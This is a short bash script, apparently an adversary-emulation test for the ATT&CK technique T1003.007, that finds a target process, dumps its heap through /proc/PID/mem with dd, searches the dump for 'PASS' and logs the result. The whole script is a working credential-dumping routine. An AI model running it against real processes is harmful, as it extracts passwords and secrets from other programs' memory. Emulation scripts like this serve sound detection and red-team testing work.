#!/bin/bash

# Variables
output_file="/tmp/T1003.007.bin"
pid_term="T1003.007"
log_dir="Linux_output/Credential_access"
log_file="${log_dir}/T1003.007_Credential_access.txt"

# Create the log directory if it does not exist
mkdir -p "$log_dir"

# Redirect stdout and stderr to both the terminal and the log file
exec > >(tee -a "$log_file") 2>&1

# Identify the PID of the target process
PID=$(pgrep -n -f "$pid_term")

# Check if PID is found
if [ -z "$PID" ]; then
    echo "Target process with term '$pid_term' not found."
    exit 1
else
    echo "Target process with term '$pid_term' found with PID $PID."
fi

# Check if process is still running
if ps -p "$PID" > /dev/null; then
    echo "Process with PID $PID is running."
else
    echo "Process with PID $PID is not running."
    exit 1
fi

# Extract memory map for the target process
HEAP_MEM=$(grep -E "^[0-9a-f-]* r" "/proc/$PID/maps" | grep heap | cut -d' ' -f 1)

# Check if heap memory range was found
if [ -z "$HEAP_MEM" ]; then
    echo "Heap memory range not found for process $PID."
    exit 1
else
    echo "Heap memory range found: $HEAP_MEM."
fi

MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
MEM_SIZE=$(echo $((MEM_STOP-MEM_START)))

# Dump memory content to output file
dd if="/proc/${PID}/mem" of="$output_file" bs=1 skip="$MEM_START" count="$MEM_SIZE" status=none

# Check if the dump was successful
if [ $? -ne 0 ]; then
    echo "Failed to dump memory of process $PID."
    exit 1
else
    echo "Memory dump successful. Dump saved to $output_file."
fi

# Search for specific pattern in the output file (e.g., "PASS")
if grep -i "PASS" "$output_file"; then
    echo "PASS found in the memory dump."
else
    echo "PASS not found in the memory dump."
fi

# Clean up: Remove the output file
rm -f "$output_file"

# Provide feedback
echo "Memory dump and analysis completed."
echo "Results saved in: $log_file"

